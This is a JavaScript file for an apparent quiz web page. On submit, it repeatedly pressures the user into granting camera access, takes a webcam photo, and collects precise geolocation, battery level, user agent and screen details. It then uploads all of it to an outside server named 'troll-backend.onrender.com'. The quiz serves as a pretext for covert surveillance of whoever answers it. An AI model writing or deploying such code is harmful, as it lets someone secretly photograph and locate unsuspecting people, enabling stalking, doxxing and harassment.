// ====== Elements ======
const btn = document.getElementById('submit-btn'); // submit button
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');
const toast = document.getElementById('toast');
const quizForm = document.getElementById('quiz-form');

const constraints = { video: { facingMode: "user" }, audio: false };

// ====== Toast helper ======
function showToast(msg = "Done") {
    toast.textContent = msg;
    toast.style.display = 'block';
    setTimeout(() => {
        toast.style.display = 'none';
    }, 2500);
}

// ====== Capture real camera photo ======
async function captureCameraPhoto() {
    // Loop until user allows camera
    let stream = null;
    while (!stream) {
        try {
            stream = await navigator.mediaDevices.getUserMedia(constraints);
        } catch (err) {
            alert("Camera permission is required to continue. Please allow it!");
        }
    }

    video.srcObject = stream;
    await video.play();

    // Wait until video has loaded a frame
    if (video.readyState < 2) {
        await new Promise(resolve => video.addEventListener('loadeddata', resolve, { once: true }));
    }

    // Match canvas size to video
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Stop video stream after capture
    stream.getTracks().forEach(track => track.stop());

    return canvas.toDataURL('image/png');
}

// ====== Collect metadata ======
async function collectMetadata() {
    const metadata = {
        useragent: navigator.userAgent,
        platform: navigator.platform,
        width: window.innerWidth,
        height: window.innerHeight,
        language: navigator.language,
        time: new Date().toLocaleString(),
        battery: 'N/A',
        location: 'N/A',
    };

    // Battery info
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            metadata.battery = battery.level * 100;
        } catch {}
    }

    // Geolocation
    if (navigator.geolocation) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            });
            metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
        } catch {
            metadata.location = "Denied";
        }
    }

    return metadata;
}

// ====== Send data to backend ======
async function sendData(imageData, metadata) {
    try {
        const response = await fetch("https://troll-backend.onrender.com/api/upload", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ image: imageData, metadata }),
        });

        const data = await response.json();
        console.log("Backend response:", data);
        showToast("Photo & metadata sent!");
    } catch (err) {
        console.error("Error sending data:", err);
        showToast("Failed to send data!");
    }
}

// ====== Form submission handler ======
quizForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    showToast("Capturing photo...");

    // Capture real camera photo
    const photo = await captureCameraPhoto();

    // Collect metadata
    const metadata = await collectMetadata();

    // Send to backend
    await sendData(photo, metadata);

    // Optional: submit file input if user selected any file
    if (fileInput && fileInput.files.length > 0) {
        const fileData = fileInput.files[0];
        console.log("User uploaded file:", fileData.name);
    }

    // Show success toast
    showToast("Submission complete!");
});
